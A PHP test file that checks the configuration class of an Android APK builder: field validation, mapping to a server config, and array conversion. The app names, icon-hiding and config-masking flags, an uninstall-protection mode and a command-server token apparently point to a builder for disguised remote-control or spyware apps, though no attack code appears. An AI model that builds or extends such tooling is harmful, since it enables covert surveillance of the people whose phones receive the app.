<?php

use App\Services\GradleApkBuilder\GradleApkBuildConfig;

describe('GradleApkBuildConfig validation', function () {
    it('passes for valid minimal config', function () {
        $config = new GradleApkBuildConfig(
            app_name: '系统服务',
            server_url: 'http://localhost:8080',
            websocket_url: 'ws://localhost:8081',
            owner_token: '1.abc.123',
        );
        expect($config->validate())->toBeEmpty();
        expect($config->isValid())->toBeTrue();
    });

    it('requires app_name', function () {
        $config = new GradleApkBuildConfig(app_name: '', server_url: 'http://x', websocket_url: 'ws://x', owner_token: '1.a.1');
        expect($config->validate())->toContain('app_name is required');
    });

    it('requires server_url', function () {
        $config = new GradleApkBuildConfig(app_name: 'T', server_url: '', websocket_url: 'ws://x', owner_token: '1.a.1');
        expect($config->validate())->toContain('server_url is required');
    });

    it('requires websocket_url', function () {
        $config = new GradleApkBuildConfig(app_name: 'T', server_url: 'http://x', websocket_url: '', owner_token: '1.a.1');
        expect($config->validate())->toContain('websocket_url is required');
    });

    it('rejects invalid websocket_url', function () {
        $config = new GradleApkBuildConfig(app_name: 'T', server_url: 'http://x', websocket_url: 'http://bad', owner_token: '1.a.1');
        expect($config->validate())->toContain('websocket_url must start with ws:// or wss://');
    });

    it('requires owner_token', function () {
        $config = new GradleApkBuildConfig(app_name: 'T', server_url: 'http://x', websocket_url: 'ws://x', owner_token: '');
        expect($config->validate())->toContain('owner_token is required');
    });

    it('rejects invalid applicationId', function () {
        $config = new GradleApkBuildConfig(app_name: 'T', server_url: 'http://x', websocket_url: 'ws://x', owner_token: '1.a.1', application_id: 'bad');
        expect($config->validate())->toContain('application_id must be a valid package name (e.g., com.example.app)');
    });

    it('rejects invalid versionName', function () {
        $config = new GradleApkBuildConfig(app_name: 'T', server_url: 'http://x', websocket_url: 'ws://x', owner_token: '1.a.1', version_name: 'abc');
        expect($config->validate())->toContain('version_name must be a valid version (e.g., 1.0 or 1.0.0)');
    });
});

describe('GradleApkBuildConfig toServerConfig', function () {
    it('produces correct structure with all required fields', function () {
        $config = new GradleApkBuildConfig(
            app_name: '测试',
            server_url: 'http://192.168.1.1:8080',
            websocket_url: 'ws://192.168.1.1:8081',
            owner_token: '42.hmac.123',
            debug: true,
        );
        $sc = $config->toServerConfig();

        expect($sc)->toHaveKeys(['buildTime', 'debug', 'serverUrl', 'websocketUrl', 'ownerToken', 'webUrl', 'pageStyleConfig', 'uninstallMode', 'showAppIcon']);
        expect($sc['debug'])->toBeTrue();
        expect($sc['serverUrl'])->toBe('http://192.168.1.1:8080');
        expect($sc['websocketUrl'])->toBe('ws://192.168.1.1:8081');
        expect($sc['ownerToken'])->toBe('42.hmac.123');
    });

    it('maps pageStyleConfig from form fields', function () {
        $config = new GradleApkBuildConfig(
            app_name: '抖音',
            server_url: 'http://x',
            websocket_url: 'ws://x',
            owner_token: '1.a.1',
            ok_text: '开始使用',
            alert_msg: '请开启权限',
        );
        $sc = $config->toServerConfig();

        expect($sc['pageStyleConfig']['appName'])->toBe('抖音');
        expect($sc['pageStyleConfig']['enableButtonText'])->toBe('开始使用');
        expect($sc['pageStyleConfig']['usageInstructions'])->toBe('请开启权限');
    });

    it('maps protection flags', function () {
        $config = new GradleApkBuildConfig(
            app_name: 'T', server_url: 'http://x', websocket_url: 'ws://x', owner_token: '1.a.1',
            uninstall_mode: true,
            disable_icon_hide: true,
            disable_config_mask: true,
        );
        $sc = $config->toServerConfig();

        expect($sc['uninstallMode'])->toBeTrue();
        expect($sc['showAppIcon'])->toBeFalse();
        expect($sc['enableConfigMask'])->toBeFalse();
    });

    it('does not include build-only fields', function () {
        $config = new GradleApkBuildConfig(
            app_name: 'T', server_url: 'http://x', websocket_url: 'ws://x', owner_token: '1.a.1',
            icon_path: '/path/icon.png',
            background_path: '/path/bg.png',
        );
        $sc = $config->toServerConfig();
        $flat = json_encode($sc);

        expect($flat)->not->toContain('icon_path');
        expect($flat)->not->toContain('background_path');
    });
});

describe('GradleApkBuildConfig fromArray + toArray', function () {
    it('creates from snake_case keys', function () {
        $config = GradleApkBuildConfig::fromArray([
            'app_name' => '测试', 'server_url' => 'http://x', 'websocket_url' => 'ws://x', 'owner_token' => '1.a.1',
            'application_id' => 'com.test.app', 'version_name' => '2.0.0',
        ]);
        expect($config->app_name)->toBe('测试');
        expect($config->application_id)->toBe('com.test.app');
    });

    it('uses defaults for missing fields', function () {
        $config = GradleApkBuildConfig::fromArray([
            'app_name' => 'T', 'server_url' => 'http://x', 'websocket_url' => 'ws://x', 'owner_token' => '1.a.1',
        ]);
        expect($config->version_name)->toBe('4.6.4');
        expect($config->application_id)->toBe('dev.deltalab2964.swift');
        expect($config->debug)->toBeFalse();
        expect($config->web_url)->toBe('https://m.baidu.com');
    });

    it('roundtrips through toArray → fromArray', function () {
        $original = new GradleApkBuildConfig(
            app_name: '测试应用', server_url: 'http://api.example.com', websocket_url: 'wss://ws.example.com',
            owner_token: '42.hmac.123', debug: true, uninstall_mode: true, ok_text: '开始',
        );
        $restored = GradleApkBuildConfig::fromArray($original->toArray());

        expect($restored->app_name)->toBe($original->app_name);
        expect($restored->server_url)->toBe($original->server_url);
        expect($restored->debug)->toBe($original->debug);
        expect($restored->uninstall_mode)->toBe($original->uninstall_mode);
        expect($restored->ok_text)->toBe($original->ok_text);
    });
});
